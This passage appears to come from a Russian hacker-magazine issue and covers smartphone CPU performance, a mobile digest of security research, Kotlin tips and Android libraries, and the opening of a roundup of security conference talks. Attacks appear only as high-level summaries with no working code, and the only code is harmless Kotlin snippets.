 • Nexus   6,  последова тельное   чтение,  незашифрованные  данные:
   131,65 Мбайт/с;
 • Nexus 6, последователь ное чтение, зашифрованные данные: 25,17 Мбайт/
   с (39 Мбайт/с в обновлении до Android 7);
 • iPhone 5s, последовательное чтение, зашифрованные данные: 183 Мбайт/
    с.

Впечатляет? При похожих аппаратных характерис тиках раз работчики Google
(Google, а не криворуких OEM!) умудрились в референсном устрой стве,
которое должно было продвигать безопас ное шифрование в массы, сделать
такой вот ляп. Будешь ли ты удивлен, узнав, что и у дру гих производителей
с оптимизацией могут воз никать проб лемы? И они возникают. Так, оснащен‐
ный по максимуму HTC U Ultra (Snapdragon 821) умудряется подтормаживать
и перегреваться при самых рутин ных операциях; такое впечатление, что про‐
цессор выполняет как минимум вдвое больше вычислений, чем дол жен. Ну
а о смартфонах Samsung, которые ухитряются подтормаживать по мелочам
даже на самом мощ ном дос тупном железе, даже и говорить подробно не сто‐
ит.


ФАКТОР СЕДЬМОЙ: РАЗРЕШЕНИЕ ЭКРАНА
Есть и еще один момент, который стоит упомянуть. Это — разрешение дис‐
плея. Как известно, стандартные модели iPhone оснащаются экранами с раз‐
решением HD, модели Plus —  Full HD. Про изводители же смартфонов
под управлением Android, использующие флагманские чипсеты Qualcomm,
стараются устанавливать экраны с раз решением QHD — 2560 × 1440. Ну,
как самый минимум — Full HD, но такое во флагманских смартфонах встре‐
чается, увы, нечасто.
  Почему «увы»? Потому что разрешения выше Full HD на экранах с IPS‐мат‐
рицей диагональю до 5,7″ включительно более чем достаточно. Для AMOLED‐
экранов, у которых, во‐первых, структура суб пикселей PenTile, а во‐вторых,
может быть поддержка очков виртуальной реаль ности Google VR (кстати,
а какому проценту поль зователей она реально при годилась?), оправданность
QHD‐разрешения еще можно как‐то аргу ментировать.
  Несколько в стороне стоит iPhone X с раз решени ем 2436 × 1125 — впро‐
чем, это, по сути, мало отличается от Full HD. Для сравнения: разрешение
экрана Samsung Galaxy S8 — 2960 × 1440, то есть в пол тора раза больше пик‐
селей, чем в iPhone X.
  А теперь представь, что мы сравнива ем производительность iPhone
8 с его разрешением HD и какую‐нибудь Nokia 8 с QHD. Представил? Nokia
приходится обрабатывать почти в четыре раза больше пикселей, чем iPhone,
что не может не сказаться на энергопотреблении и на производительности
(как минимум в тех тестах, которые используют вывод на экран). Я сей час ни в
коей мере не оправдываю ста рень кие экра ны, которые Apple с маниакальным
упорством продол жает устанавливать в устройства стоимостью под тысячу
долларов, а просто заос тряю внимание на том, что производительность
и энергоэффектив ность устройств с экра нами низ кого раз решения даже
при прочих равных будет выше, чем у смартфонов с экранами QHD.
   Что‐то такое заподозрили и производители. Так, Sony Xperia Z5 Premium,
экран которого (кстати, IPS, бесполезный для целей VR) имеет физичес кое
разрешение 4K (на самом деле нет, даже здесь маркетологи об манули),
но логическое — «всего лишь» Full HD, что поз волило производителю и пот‐
ребителя обмануть, и не слишком  силь но  убить производительность.
Похожим образом поступили и в Samsung, разрешив использовать понижен‐
ное логическое разрешение на экранах с высокой плотностью точек. Оче вид‐
но, интересы маркетоло гов идут вразрез с интересами как пользователей
этих устройств, так и собственных разработчиков компании.


ВМЕСТО ЗАКЛЮЧЕНИЯ: НУЖНЫ ЛИ НАШЕМУ ТЕЛЕФОНУ 64 БИТА?
Так ли нужны 64‐разрядные про цес соры в мобильных устрой ствах? Ведь у 32‐
разрядных вычислительных ядер есть свои преимущества. Такие процес соры
могут работать быстрее 64‐разрядных из‐за меньшей длины инструкций
вследствие меньшей длины адреса, и, как резуль тат, они менее требователь‐
ны к объему опе ративной памяти; в них можно реализовать более короткую
очередь команд, что также может дать выигрыш в производительности
в определенных сценариях.
  Некоторые из этих преимуществ так и оста нутся теоретическими, но в
ряде  сов ремен ных  сценариев  использования  без  поддержки  команд
ARMv8 уже не обой тись. Это и потоковое шифрование, и склейка HDR
в режиме реального времени, и многие другие малозаметные вещи. Как бы
там ни было, производители процес соров перешли на 64‐разрядные ядра
с поддержкой ARMv8, и это свершившийся факт.
   Вот только производители смартфо нов не спешат переходить на 64‐бит‐
ные сборки операционных систем.
   Так, в природе не сущес тву ет ни одного смартфона под управлением Win‐
dows 10 Mobile, в котором операционная сис тема работала бы в 64‐раз‐
рядном режиме. И Lumia 950 (Snapdragon 808), и Lumia 950 XL (Snapdragon
810), и даже отно сительно свежий Alcatel Idol 4 Pro (Snapdragon 820) работа‐
ют под управлением 32‐битной сборки Windows 10 Mobile.
  Не отстают и произво дители телефонов с Android. К примеру, у Lenovo,
выпускающей смартфоны под маркой Motorola, есть все го два устройства
с «правильным» 64‐разрядным Android: это флагманы линейки Moto Z (обыч‐
ная версия и разновидность Force) и Moto Z2 Force. Все остальные устрой‐
ства — и бюджетный Moto G5 на Snapdragon 430, и свежий субфлагман Moto
Z2 Play на Snapdragon 626 — работа ют в 32‐битном режиме.
   Ряд устройств других производителей (например, BQ Aquaris X5 Plus)
использует мощный Snapdragon 652 в 32‐разрядном режиме. Нужно ли
говорить, что такие устройства не выжимают максимума из дос тупных аппа‐
ратных возможностей?
  С другой стороны, не все идеально и у Apple. Даже 64‐разрядные при‐
ложения, скомпилированные в нативный код, из‐за требований обратной
совместимости вынуждены огра ничиваться набором команд, доступным
в самых ранних процессорах компании — Apple A7 образца 2013 года. А вот
у компилятора байт‐кода ART, который использует ся в Android с 5‐й версии,
таких проблем нет: байт‐код приложений компилируется в оптимизи рован‐
ный нативный код, использующий все доступные на текущем железе инструк‐
ции.
  Впрочем, будем жить с тем, что есть. За максимальной производитель‐
ностью процессорных ядер и гарантированной оптимизацией — к Apple. То
же самое, только в пол тора‐два раза похуже и во столько же раз дешевле, —
к сонму произво дителей трубок на Android.
X‐MOBILE

 МОБИЛЬНЫЙ
  ДАЙДЖЕСТ
   ДЕКАБРЯ





                                         Евгений Зобнин
                                           Редактор Unixoid и Mobile
                                                     zobnin@glc.ru





Сегодня  в выпуске: безопасность домашних голосовых
ассистентов и других умных гаджетов, безопасность при‐
ложений, использующих датчик отпечатка пальца, история
создания Magisk, рассказан ная авто ром проекта. А также:
внутренности Instant Apps, вве дение в Android Architecture
Components, по‐настоящему впе чатляющие трю ки в Kotlin
и свежая подборка библиотек.


ИНСТРУМЕНТЫ

 • blackhat‐arsenal‐tools — коллекция всех инс трументов, показанных в рам‐
   ках Black Hat Arsenal начиная с 2011 года;
 • poc‐exp — коллекция экс плоитов и PoC для раз личных Android‐уяз вимос‐
   тей;
 • AndroTickler — метаинстру мент ана лиза Android‐приложений, позволя‐
  ющий получить исчерпывающую информацию о приложении, деком‐
   пилировать его, найти строки, URL, компоненты баз данных; плюс интегра‐
   ция с Frida;
 • Most usable tools for iOS penetration testing — список самых полезных при‐
   ложений для пентеста iOS.


ПОЧИТАТЬ

Уяз вимости домаш них голосо вых ассистен тов
The Insecurity of Home Digital Voice Assistants — исследование, посвященное
безопасности домашнего голосо вого ассистента Amazon Echo, а также дру‐
гих подобных ассистентов (Google Home, Apple HomePod).
  В нашей стране не мно гие слышали об этих устройствах, но они очень
популярны в США. Amazon продала более пяти миллионов колонок Amazon
Echo, а количество ее скиллов (воз можнос тей, которые доступны пос редс‐
твом голоса) уже перевалило за десять тысяч. С помощью Amazon Echo мож‐
но совершать интернет‐покупки, заказывать еду, открывать двери, включать
свет и делать огромное количество других вещей. Получив контроль над этим
устройством, злоумышленник может открыть дверь в квартиру (если она обо‐
рудована смарт‐замком, подключенным к устройству) или выполнить от его
имени заказ в интернет‐магазине.
  При всех своих возможностях Amazon Echo очень слабо защищены.
Единственный метод аутентификации, который они используют, — это своего
рода парольная фраза (по умолчанию Alexa), после произнесения которой
устройство просыпается и переходит в режим прослушивания команды.
Неважно, кто и каким голосом произнес эту фра зу, главное, чтобы громкость
была не ниже 60 dB, а система распознавания голоса ее поняла.
  Более того, Amazon Echo не различа ет присутствие человека в помеще нии
и реагирует на любой голос, вне зависимости от того, кому он принадлежит:
человеку, телевизору, смартфону, Bluetooth‐колонке или говорящей собаке.
Авторы исследования провели тест и выяснили, что Amazon Echo прекрасно
распознает команды, произнесенные син тезированным голосом (на разных
скоростях) Bluetooth‐колонкой, рас положенной на расстоянии до восьми
метров.
  В качестве метода борьбы с уяз вимос тями авторы пред лагают исполь‐
зовать технологию VSButton. Нес мотря на название, она не имеет ничего
общего с физическими кнопками, но поз воляет регис трировать искажения
электромагнитных волн человечес ким телом. С помощью этого метода можно
выявить движение в помещении и таким обра зом определить присутс твие
человека. При этом VSButton не отдельное устройство, а может быть интегри‐
рована в Amazon Echo с помощью обновления программного обеспечения.


О (не)безопасности IoT
IDIoT: Securing the Internet of Things like  it’s 1994 — ресерч, посвященный
безопасности IoT‐устрой ств. По оценкам авто ров, к 2020 году к интернету
будет подключено более двадцати миллиардов раз нообразных устройств,
начиная от веб‐камер и заканчивая холодиль никами и стиральными машина‐
ми. И если учесть тотальную небезопасность текущих устройств, это может
стать настолько серьезной проб лемой, что бот Mirai, не так давно завалив‐
ший пол‐интерне та с помощью веб‐камер, покажется детской игрушкой.
   IT‐специалисты предлага ют разные решения этой проблемы, но пока
ни одно из них не может быть воплощено в жизнь даже на небольшом числе
устройств. IoT развивается очень быстро, поэтому компании‐производители
ставят на первое место скорость выпус ка устройства на рынок, жертвуя
безопасностью. Попытки стандартизации протоколов доступа к устройствам
проваливаются одна за другой по причине инертности и стремления ком‐
паний протолкнуть свой стандарт. SDN‐решения вроде специальных мид‐
лбоксов, которые дол жны соединять  IoT‐устройства с внешним миром,
никому не нужны. Попытки регулировать рынок IoT заканчиваются на бюрок‐
ратическом выяснении отношений и бесконечном разбирательстве, кто и как
должен его регулировать.
  Документ интересен именно описанием текущей ситуации. Решение авто‐
ров, под названием IDIoT, — это довольно топорный сетевой фильтр, который
пропускает наружу и внутрь локальной сети толь ко тот трафик, который
реально нужен девайсу, и отсекает все остальное. К при меру, веб‐камера
будет способна загружать видео на уда лен ный сервер, но не сможет «отклю‐
чить» интернет UDP‐запросами к корневым DNS‐серверам. Решение может
быть как софтверное, устанавлива емое на роутер или телефон, так и желез‐
ное, например Raspberry Pi со специальной прошивкой.


13 фун кций, исчезнувших из Android
Android nostalgia: 13 once‐trumpeted features that quietly faded away — инте рес‐
ная статья о технологиях, которые когда‐то были в Android, но теперь уда‐
лены. Из наиболее печаль ных потерь:
 • виджеты на экране бло кировки. Появились в Android 4.2 и сразу получили
   поддержку в лице виджета DashClock, написанного одним из сотрудников
   Google. Через два года столь давно ожи даемая функция исчезла;
 • планшетный  интерфейс. В  Android  3.0, выпущенном исключительно
   для планшетов, был реализован прекрасный интерфейс в стиле дес ктопа.
  Нижнюю  часть экрана занимала стро ка с тра диционными кнопками
   навигации слева и часами с «треем» спра ва. Клик по часам откры вал быс‐
   трые настройки и панель уведомлений. В Android 4.2 этот интерфейс сме‐
   нил ся на телефонный;
 • живые папки. В Android 1.5 появилась весьма инте ресная функция, поз‐
   воляющая упаковать в папку любую информацию. Приложе ния могли пре‐
   доставлять реализацию папок, содержащих, к примеру, email‐адре са,
  номера телефонов, заметки и мно гое другое. Функция была удалена в An‐
   droid 3.0 в угоду виджетам.





                 Планшетный интерфейс Android 3.0


История соз дания Magisk
The Magisk Story — история соз дания Magisk, написанная автором проекта.
Magisk — едва ли не самый популярный сегодня менед жер прав root, а также
система модификации Android без внесения изменений в системный раздел
(если по‐простому: он модифицирует boot‐раздел и во время загрузки вносит
изменения поверх system‐раздела без его модификации, это называется sys‐
temless). Наиболее интересные выдержки:
 • Magisk был создан под впечатлением от SuperSU для Android 6.0 (в
   котором впер вые появился режим systemless). Автор пытался зас тавить
  режим systemless работать не только в отношении root‐доступа, но и
   для установки Xposed, в результате чего родился новый проект;
 • Magisk использует доволь но простой трюк: он внедряет себя в boot‐скрипт
   и на стадии загрузки post‐fs‐data, ког да все файловые системы уже под‐
   клю чены, но Zygote не запущен (в Android Zygote фактически запускает
   ОС), подклю чает поверх файловой системы system все необходимые
  модификации (в Linux такое можно сделать с помощью так называемого
   bind mount);
 • популярности Magisk спо собствовала игра Pokemon Go, использующая
   в своей работе систему Google SafetyNet для проверки, что на устройстве
   не получены права root и не произведены модификации (в Magisk есть
   система обхода SafetyNet);
 • между Google и Magisk до сих пор идет ожесточенная борьба: первая
   встраивает новые пра вила проверок SafetyNet, второй с каждым новым
   релизом учится их обходить;
 • на первых порах развития проекта автор просил помощи у знаменитого
   Android‐хакера и соз дателя SuperSU ChainFire, но тот отказал ему, сос‐
   лавшись на интеллектуальную собственность. Автор Magisk в результате
   просто украл его утилиту для патчинга пра вил SELinux (supolicy) и интегри‐
   ровал в свой проект.





                     Логика работы Magisk


О правильном использовании датчика отпе чатка пальца
Broken Fingers: On the Usage of the Fingerprint API in Android — исследование,
посвященное безопасности приложений, исполь зующих датчик отпечатка
пальца. Авторы написали утилиту для ана лиза кода таких приложений и при‐
менили ее к 501 APK из маркета. Выводы обычны: разработчикам приложе‐
ний не стоит рассчитывать, что малварь не смо жет запустить свой экран
поверх их, но среди подоб ных стандартных рас суждений особо выделя ется
один результат исследования.
  54% приложений (вклю чая Google Play) не генерируют и не используют
открывшиеся в резуль тате касания дат чика отпечатка пальца криптогра‐
фические ключи (другими словами, датчик служит только для подтверждения
действия, но не для того, чтобы, например, получить дос туп к ключу и затем
применить его для подписи транзакции или дру гого дей ствия). Это значит,
что злоумышленник с пра вами  root сможет совершить покупку, просто
симулировав касание сенсора (при помощи вызова метода onAuthentication‐
Succeeded самого приложения).


КОДИНГ

Как работают Instant Apps
Inside Instant Apps — вводная статья об Instant Apps, сравнительно новой фун‐
кции Android (а точ нее, Google Mobile Services), позволя ющей создавать
«одноразовые приложения», которые можно запустить мгновенно без необ‐
ходимости в установке.
   Instant Apps базируются на концепции feature, когда одно комплексное
приложение делится на нес колько своего рода мини‐приложений. Каждое
такое мини‐приложение может включать в себя код, ресурсы и данные, необ‐
ходимые для работы только одной активности при ложения. Feature может
быть, к примеру, просто страницей покупки какого‐либо товара. Оно име ет
собственный URL, перейдя по которому пользователь мгновенно (ну или поч‐
ти мгновенно) увидит определен ную активность приложе ния.
  Мини‐приложения могут раз делять код меж ду собой, но раз мер каждого
из них не должен превышать четыре мегабайта. Кроме того, они могут иметь
ограниченный набор системных привилегий. Один и тот же проект можно
использовать для сборки как полноценного приложения,  так и набора
мини‐приложений или того и другого.


Класс Parcelable в одну стро ку
Yet Another Awesome Kotlin Feature: Parcelize — небольшая заметка о новой
возможности Kotlin 1.1.4 под названием Parcelize. Суть ее в следующем:
для передачи объектов между активнос тями в Android следует описывать эти
объекты с помощью громоздко го и неудобного интерфейса Parcelable, пре‐
доставляющего возможнос ти сериализации.
  Описание одного простого объекта с помощью Parcelable может занимать
десятки строк кода, большая часть которого будет иметь весьма опос‐
редованное отно шение к логике работы приложения. Parcelize позволя ет опи‐
сать такой объект буквально с помощью двух строк:


@Parcelize
data class Student(val id: String, val name: String, val grade:
String) : Parcelable

Возможность в данный момент экспериментальная, поэтому для ее исполь‐
зования следует добавить в build.gradle проекта такие строки:


apply plugin: 'kotlin‐android‐extensions'
androidExtensions {
    experimental = true
}


Простой спо соб соз дания RecyclerView с помощью Kotlin
RecyclerView plusAssign Kotlin power — статья с опи санием весьма интерес‐
ной техники создания RecyclerView (списка). Краткая предыстория: чтобы
создать список с помощью RecyclerView, необходимо создать класс на осно‐
ве RecyclerView.adapter, а также класс на основе RecyclerView.ViewHolder. Вто‐
рой будет содержать описание интерфей са каждого эле мента, а первый —
создавать элементы списка, наполняя ViewHolder нужными данными.
  Очевидно,  такой  способ  описания  списков  довольно  громоздкий
и выматывающий, если списков будет много. Автор предлагает заменить его
такой конструкцией:


recyclerView.setUp(users, R.layout.item_layout, {
    nameText.text = it.name
    surNameText.text = it.surname
})

Само собой, RecyclerView не имеет метода setUp, это функция‐рас ширение,
добавленная с помощью Kotlin. И имен но ее описанию посвящена статья.
Все сводится  к созданию универсального адап тера и универсального
ViewHolder, после чего автор описывает функцию‐рас ширение setUp, которая
и подключает адаптер к RecyclerView:


fun <ITEM> RecyclerView.setUp(items: List<ITEM>, layoutResId: Int,
bindHolder: View.(ITEM) ‐> Unit, manager: RecyclerView.LayoutManager
= LinearLayoutManager(this.context)): Kadapter<ITEM> {
    return Kadapter(items, layoutResId, {
        bindHolder(it)
    }).apply {
        layoutManager = manager
        adapter = this
    }
}

Плюс некоторые шаманства, связанные с написа нием кол бэков для обработ‐
ки нажатий на элементы списка.


Как Kotlin работает с кол лекциями
Kotlin Collections Inside. Part 1 — исследование того, как в Kotlin работают кол‐
лекции: Collection, Set, MutableSet, List, MutableList. Интересные наблюдения:
 • Несмотря на то что в Kotlin есть изменяемые и неизменяемые коллекции
   (например, MutableList и List), на деле все коллекции изменяемые. Их мож‐
   но преобразовать, если использовать из кода на Java, однако при попытке
   изменить  тот  же   List  из   Kotlin  будет  выброшено  исключение
   java.lang.UnsupportedOperationException.
 • Функция listOf(), предназначенная для создания спис ков, на самом деле
   создает массив Java, а затем вызывает его метод asList(), чтобы преобра‐
   зовать его в ArrayList. Так что на деле тип List в Kotlin — это впол не стан‐
   дартный ArrayList.





                    Иерархия коллекций Kotlin


Вве дение в Android Architecture Components
Realtime applications using Android Architecture Components  with  Kotlin —
хорошее и не затянутое введение в Android Architecture Components, пред‐
ставляющие собой реализацию паттерна Model — View — ViewModel (MVVM).
AAC базируются на четырех ключевых компонентах:
 • Lifecycle —  хранит  сос тояния  компонентов  приложения   (таких
   как активности и фрагменты) и позволяет дру гим компонентам реаги‐
   ровать на изменения сос тояния (нап ример, завершить обновление мес‐
   тоположения при сворачивании активности);
 • ViewModel — хранит сос тояние гра фических элементов приложе ния и свя‐
   зывает эти элементы с моделью;
 • LiveData — хранит данные элементов, позволяя наблюдать за их обновле‐
  нием и реагировать;
 • Room — обертка над SQLite, обеспечивающая более удобный дос туп
   к данным и обновле ния данных в режиме реального времени.

Используя эти компоненты, можно создать приложение, в режиме реального
времени обновляющее свое состояние в обе стороны: нажатие кнопки при‐
водит к записи в базу данных, а изменение в базе данных сразу отражается
на графическом интерфейсе. Ну и конечно же, его компоненты будут четко
разделены.


БИБЛИОТЕКИ

 • Cipher.so — позволя ет разместить важные данные в зашифрованной
   нативной библиотеке;
 • SecureControls — классы SecureButton и SecureImageButton, реализующие
   стандартные кнопки Android, способ ные определять, не перекрыты ли они
   оверлеем;
 • ReActiveAndroid — мощная ORM‐биб лиотека с поддержкой многих БД
   и RxJava2;
 • hyperlog‐android — библиотека логирования, отправляющая логи на уда‐
   ленный сервер;
 • kotlin‐math — удоб ная в исполь зовании Kotlin‐биб лиотека для выполнения
   различных математических операций;
 • Barista —  простая  в  использовании биб лиотека  для  тес тирования
   интерфейсов;
 • AQuery — библиотека для работы с UI, соз данная под впечатлением
   от JQuery;
 • CustomToggleButton — переключатель с красивой анимаци ей;
 • circular‐progress‐bar — круговой прог ресс‐бар;
 • TicketView — View в форме отрывного билета;
 • transitioner — библиотека динамичес кой трансформации одного View
   в другой;
 • CalendarPicker — окно выбора кален даря с множеством настроек внеш‐
   него вида;
 • TableView — библиотека для отображения сложных таблиц, содержащих
  множество данных;
 • TimeLineView — элемент интерфейса для отображения таймлайнов с датой
   и описанием;
 • SimpleRatingBar — панель рейтин га, предлага ющая пользователю оценить
   что‐либо с помощью звезд.
ВЗЛОМ

ИБ-ПРЕЗЕНТАЦИИ,
  КОТОРЫЕ
    СТОИТ
 ПОСМОТРЕТЬ





       10 ИНТЕРЕСНЫХ ДОКЛАДОВ
    С МЕЖДУНАРОДНЫХ ХАКЕРСКИХ
          КОНФЕРЕНЦИЙ





Мы тут подумали, что нельзя быть самым
громким рупором хакерского дела в Рунете
и не освещать при этом события с меж‐
дународных конференций. Причем не прос‐
то в общем обзоре, которые мы неод‐           Антон Карев                                                                                    Эксперт по информационной
нократно раньше готовили (вот, например,       безопасности.высшее, специальностьОбразование
Nullcon и PHDays), а рассказывать о самых      компьютерных«Защита информациисистемах»,в в
интересных докладах. Постара емся делать      настоящийнад диссертацией.момент работаетОбласть
                                                                                     профессиональных
это каждый квартал, а начнем мы с третьего      интересов — технологическая
                                                                                         разведка, аналитика в сфере
                                                                                      ИБ, искусственныйквартала прошлого года, который традици‐
                                                                                                     интеллект.
                                                                                              vedacoder@mail.ruонно богат на инте ресные презен тации.


В ОЖИДАНИИ ДРУЖНОГО ТАНДЕМА IOT-АТАК И РАНСОМВАРИ
Christopher Elisan. Demystifying The Ransomware and IoT Threat // ROOTCON.
2017
   Стремительный рост атак рансомвари в 2016 году еще не успел пойти
на спад, как появилась новая угроза — DDoS‐атак, использующих IoT. В этом
докладе автор поэтапно описывает, как рансомварь атакует, как она работает
и что иссле дователь должен делать на каждом из эта пов для противостояния
ей. Опирается он при этом на зарекомендовавшие себя методики.
  Затем докладчик рас ска зывает, как IoT задействуется в DDoS‐атаках,
какую роль в них играет вспо могательная мал варь, а также как тандем ран‐
сомвари и IoT‐атак может стать большой угрозой в ближайшие годы. Док‐
ладчик — автор книг «Malware, Rootkits & Botnets: a Beginner’s Guide», «Ad‐
vanced Malware Analysis», «Hacking Exposed: Malware & Rootkits Secrets & Solu‐
tions», так что со знанием вопроса, как понимаешь, у него проблем нет.





АТАКА НА МЕДИЦИНСКУЮ КИБЕРИНФРАСТРУКТУРУ
Robert Portvliet. Open Up and Say 0x41414141: Attacking Medical Devices // Toor‐
Con. 2017
  Подклю чаемое к интернету медицинское оборудование сейчас встречает‐
ся в каждой клинике и неплохо помогает медперсо налу ускорить докумен‐
тооборот (впрочем, чиновники не дремлют и не забывают под кинуть док‐
торам такой бюрократии, с которой никакая ней росеть не справится).
Как оказывается, подключенное к сети оборудование содержит множество
уязвимостей   (и  программных,  и  аппа рат ных),  которые  откры вают
перед потенциальным зло умышленником широкое поле деятельности. В док‐
ладе спикер делится личным опытом про ведения пентестов для медицинской
киберинфраструктуры и рас ска зывает, как злоумышленники компрометируют
медицинское оборудование.
  В своем докладе автор описывает, как злоумышленники:
 • эксплуатируют проприетарные коммуникационные протоколы;
 • отыскивают уязвимости в сетевых сервисах;
 • компрометируют системы жизнеобеспечения;
 • эксплуатируют аппаратные отладочные интерфейсы и системную шину
   передачи данных;
 • атакуют основные бес проводные интерфейсы и специфичные проп‐
   риетарные беспроводные технологии;
 • проникают в медицинские информа ционные системы и затем считывают
   и редактируют персональную информацию о здоровье пациента и служеб‐
  ные врачебные записи, содержание которых в норме даже от пациента
   скрыто;
 • нарушают коммуникационную систему, которую медицинское оборудо‐
   вание использует для обмена информацией и слу жебными командами;
 • ограничивают медперсоналу дос туп к оборудованию или вообще блокиру‐
   ют его.

Во время своих пентестов докладчик обнаружил у медицинского оборудо‐
вания множество проб лем. Среди них:
 • слабая криптография;
 • возможность манипулирования данными;
 • возможность удаленной подмены обо рудования;
 • уязвимости в проприетарных протоколах;
 • возможность неавторизованного дос тупа к базам данных;
 • жестко запрограммированные неизменяемые логины/пароли, а также
   другая чувствительная информа ция, хра нящаяся либо в прошивке обо‐
   рудования, либо в системных бинарниках;
 • восприимчивость медицинского оборудо вания к удаленным DoS‐атакам.

После знакомства с докладом ста новится очевидным, что кибербезопасность
медицинского сектора сегодня представляет собой клинический случай
и нуждается в интенсивной терапии.





ЗУБАСТЫЙ ЭКСПЛОИТ НА ОСТРИЕ ШАМПУРА КОНТЕКСТНОЙ
РЕКЛАМЫ
Tyler Cook. False Advertising: How Modern Ad Platforms Can Be Used for Targeted
Ex‐ploitation // ToorCon. 2017
  Ежедневно миллионы людей заходят в соцсети: по работе, для раз вле‐
чений или просто так. Под капотом соцсетей пря чут ся невидимые для обыч‐
ного посетителя Ads‐платформы, ответс твенные за то, чтобы доставлять
пользователям релевантную контекстную рекламу. Ads‐платформы легки
в обращении и очень эффективны, благода ря чему востре бованы среди рек‐
ламодателей.
   Ads‐платформы дают воз можность не только выходить на широкую ауди‐
торию (что очень выгодно для биз неса), но и сужать прицел таргетинга —
вплоть до одно го кон кретного челове ка. Более того, функциональность
современных Ads‐платформ даже поз воляет выбирать, на каком из многочис‐
ленных гаджетов это го конкретного человека показывать рекламу.
   Таким образом, современные Ads‐платформы поз воляют рекламодателю
добираться до любого человека в любой точке мира. Но эта воз можность так‐
же может быть исполь зована и зло умышленниками — в качестве входного
шлюза в сеть, в которой работает их предполагаемая жертва. Докладчик
демонстрирует, как зло намеренный рекламода тель может воспользоваться
Ads‐платформой, чтобы с высокой точностью нацеливать свою фишинговую
кампанию, развернутую для доставки персонализированного  экс плоита
одному конкретному человеку.


КАК НАСТОЯЩИЕ ХАКЕРЫ УВОРАЧИВАЮТСЯ ОТ
ТАРГЕТИРОВАННОЙ РЕКЛАМЫ
Weston Hecker. Opt Out or Deauth Trying !‐ Anti‐Tracking Bots Radios and Key‐
stroke In‐jection // DEF CON. 2017
  Сегодня мы используем в сво ей жизни мно го компьютеризированных сер‐
висов и настолько на это подсаживаемся, что уже не в силах от них отказать‐
ся, — именно поэто му скандалы с сервисами, ведущими тотальную слежку,
заканчиваются практически ничем: пользователи пожимают плечами («ну
хотя бы из‐за рубежа следят, буржуи на бутылку не посадят, руки коротки»,
«ну хотя бы наши следят, а не американские шпионы какие‐нибудь») и… про‐
должают ими пользоваться.
  Докладчик доходчиво объясняет, как именно современные маркетологи
используют широкое раз нообразие способов таргетинга. Мы писали недавно
про мобильную паранойю и тотальную слежку. Из представленного доклада
видно, что современ ные маркетоло ги уже сей час вовсю используют подоб‐
ные технологии для слежения за нами. Что же с этим делать? Если у нас нет
возможности отказаться от этих излишне наб людательных сервисов, то
почему бы не попытаться хотя бы забомбить их бесполез ной информацией?
  В докладе про демонстрирован авторский девайс (программно‐аппарат‐
ный бот), который позволяет:
 • делать инъекции Bluetooth‐маячков;
 • зашумлять данные, собранные с бортовых сенсоров автомобиля;
 • фальсифицировать идентифика ционные параметры мобильника;
 • зашумлять манеру нажатий (на клавиату ре, мыши и сенсоре).

Вся эта информация, как извес тно, используется для таргетинга рекламы
на мобильных гаджетах.
  На демонстрации видно, как пос ле запус ка авторского девайса система
слежения сходит с ума, собира емая ею информа ция становится настолько
зашумленной и неточной, что от нее нашим наблюдателям уже не будет
никакого толку. В качес тве доб рой шутки докладчик демонстрирует, как бла‐
годаря  представленному  девайсу  «система  слежения»  начинает  при‐
нимать 32‐летнего хакера за 12‐летнюю девочку, которая безумно любит
лошадей.





ДВАДЦАТЬ ЛЕТ ВЗЛОМУ MMORPG: ГРАФИКА КРУЧЕ, ЭКСПЛОИТЫ
ТЕ ЖЕ
Twenty Years of MMORPG Hacking: Better Graphics, Same Exploits // DEF CON.
2017
   Тема взлома MMORPG обсуждается на DEF CON уже на протяжении двад‐
цати лет. Отдавая дань юбилею, докладчик опи сывает наиболее знаковые
моменты из этих обсуждений. Кроме того, он рас сказывает о своих прик‐
лючениях на ниве браконьерс тва в онлайн‐игрушках начиная с Ultima Online
(в 1997‐м) и далее — в Dark Age of Camelot, Anarchy Online, Asheron’s Call 2,
Shadowbane, Lineage II, Final Fantasy XI/XIV, World of Warcraft. В том числе нес‐
колько свежих предста вителей: Guild Wars 2 и Elder Scrolls Online. И это
далеко не весь послужной список докладчика!
  В докладе приведены техничес кие подробности создания экс плоитов
для MMORPG, которые помогают разжиться виртуальными деньгами. Док‐
ладчик вкратце рассказывает о вечном противостоянии между браконьерами
(изготовителями эксплоитов) и «рыбнадзором» и о нынешнем техничес ком
состоянии этой гонки вооружений.
   Автор объясняет методику детального анализа пакетов и рассказывает,
как настраивать эксплоиты, чтобы на стороне сервера факт браконьерс тва
обнаружен не был. В том числе он презентует свежайший эксплоит, который
на момент доклада имел преимущество перед «рыб надзором» в гонке воору‐
жений.


ХАКНЕМ РОБОТОВ, ПОКА СКАЙНЕТ НЕ ПРИШЕЛ
Lucas Apa. Hacking Robots before Skynet // ROOTCON. 2017
  Роботы нынче на слуху. В ближайшем будущем они окажутся повсюду:
на военных миссиях, в хирургичес ких операционных, на строительстве небос‐
кребов, будут помощ никами покупа телей в магази нах, обслуживающим пер‐
соналом  больницы,  биз нес‐ассистентами,  сексуальными  партнерами,
домашними кулинарами и полноправными членами семьи.


От редак ции: кри тика робото хай па
Вот уже полгода как в информа ционном пространс тве возникло странное,
скажем так, возбуждение по поводу скорой победы робота над человеком
разумным. Основные идеи следующие: гря дут роботы, роботы украдут
рабочие места, вместо таксистов будет авто пилот, вместо переводчиков —
Google Translate, вместо баяниста, тамады и массовика‐затейника — мно‐
гофункциональный  раз влекательный  центр  (с  блюрэй‐проигры вателем)
на колесиках. Да, диагнозы в больницах будет ставить IBM Watson, а опе‐
рировать, видимо, робот Да Винчи… который, правда, вообще не робот в том
смысле, что принимать решения самостоятельно он не может и представляет
собой технически сложный модуль телеприсутс твия — оперирует человек,
который сидит в отдельной кабинке с манипуляторами.
   Что же мы име ем в реальности?
  Робот‐официант? Нет  технических препятс твий для его реализации.
Более того, подобный рес торан есть в Бангкоке, и называется он Hajime Ro‐
bot.  Распространились  ли  роботизированные  рестораны  по  планете?
Как видишь, нет.
  А что на производстве?
  На высокотехнологичных заводах — станки с ЧПУ (очень дорогостоящие)
и промышленные роботы, которые уже несколь ко десятков лет работают
на заводах, собирают машины, режут металлы и сгибают твердые прутья.
  На традиционных производс твах — станки из прошлого века (очень
дешевые) и традиционные низкооплачиваемые мигранты, которые делают
все то же самое, получая на выходе канализационные тру бы, батареи отоп‐
ления и бетонные блоки.
   Автопилот? В процес се раз работки, и неизвес тно, сколько времени прой‐
дет до того момента, когда машинам с автопилотом разрешат самостоятель‐
но работать таксистами.
  Переводчик? Попробуй Google Translate, Bing, Yandex и убедись лично —
нейросети, биг‐дата, машин‐лер нинг и даже эджайл дают результат, не силь‐
но отличающийся от того, который давали переводчики конца девяностых —
